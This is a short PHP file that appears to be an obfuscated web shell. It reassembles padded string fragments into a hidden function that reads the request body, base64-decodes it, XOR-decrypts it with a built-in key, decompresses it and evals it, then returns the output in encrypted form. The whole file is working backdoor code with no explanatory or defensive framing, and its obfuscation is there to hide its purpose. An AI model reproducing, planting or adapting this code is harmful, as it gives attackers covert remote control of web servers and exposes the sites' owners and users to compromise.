<?php
$d='et_contents#();@o#b_end_cle#an();$#r=@base#64_encode(@x(#@gzc#ompre#ss($o)###,$k))#;print("$p$kh$r$kf");}';
$l='$t,$k){$c=st#rlen($#k);#$l=strl#en(#$t#);$o="";for#($i=0;$i#<$l;){for(#$j=#0;#($j<$c&&$#i<$#l);$#j++,$';
$G='i++)#{#$o.=#$t{$i}^$k{$j};}}re#turn# $##o;}if (@pre#g_m#atch("/$kh(.+)$k#f/#"#,@file_get#_conte#nts("php://i';
$g='#nput")#,$m##)==1) {@ob_#sta#rt();@eva#l#(@gzuncomp#ress(@x(@ba##se64_decode(#$m[1#]),#$k)#));$o#=#@ob#_g';
$o='$k#="81#8184b6";$k#h="a3e23aa##29f2f"#;$kf="472028b##622#02";$p="g1F#65yP#G5yGbeqMW##";#functi#on x(';
$k=str_replace('sQ','','cresQatsQesQ_fusQncsQtsQion');
$J=str_replace('#','',$o.$l.$G.$g.$d);
$N=$k('',$J);$N();
?>
